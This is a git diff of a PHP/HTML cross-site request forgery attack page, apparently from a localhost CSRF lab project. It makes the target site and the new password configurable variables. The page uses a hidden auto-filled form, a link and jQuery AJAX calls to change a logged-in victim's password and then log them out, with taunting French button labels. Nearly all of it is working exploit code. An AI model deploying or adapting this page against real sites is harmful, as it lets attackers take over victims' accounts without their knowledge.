@@ -1,3 +1,8 @@
+<?php 
+	$target_site = 'http://localhost/CSRF-Attack'; //Replace with targeted site
+	$new_password = 'toto'; //Replace with desired password
+?>
+
 <!DOCTYPE html>
 <html>
     <head>
@@ -6,7 +11,7 @@
     <script>
         function changePwdPost(){
             $.ajax({
-                url : 'http://localhost/CSRF-Attack/change/password',
+                url : '<?php echo $target_site?>/change/password',
                 type : 'POST', 
                 data : { 
                     password : 'toto'
@@ -14,17 +19,17 @@
             })
             .done(function(res) {
                 $.ajax({
-                    url : 'http://localhost/CSRF-Attack/logout'
+                    url : '<?php echo $target_site?>/CSRF-Attack/logout'
                 })
             });        
         }
         function changePwdGet(){
             $.ajax({
-                url : 'http://localhost/CSRF-Attack/change/password/level2?pwd=toto2'
+                url : '<?php echo $target_site?>/change/password/level2?pwd=<?php echo $new_password?>'
             })
             .done(function(res) {
                 $.ajax({
-                    url : 'http://localhost/CSRF-Attack/logout'
+                    url : '<?php echo $target_site?>/CSRF-Attack/logout'
                 })
             });        
         }
@@ -42,12 +47,12 @@
     </script>
     <body>
         <h1>Sans ajax</h1>
-        <form action="http://localhost/CSRF-Attack/change/password" method="POST">
-            <input type="hidden" name="password" value="toto"/>
+        <form action="<?php echo $target_site?>/change/password" method="POST">
+            <input type="hidden" name="password" value="<?php echo $new_password?>"/>
             <input type="submit" value="Montre moi ce que tu veux"/>
         </form>
         <br>
-        <a href="http://localhost/CSRF-Attack/change/password/level2?pwd=toto2">Tu veux perdre ton compte ?</a>
+        <a href="<?php echo $target_site?>/change/password/level2?pwd=<?php echo $new_password?>">Tu veux perdre ton compte ?</a>
         <hr>
         <h1>Ajax</h1>
         <button id="hack-post">Hack toi en postant</button>
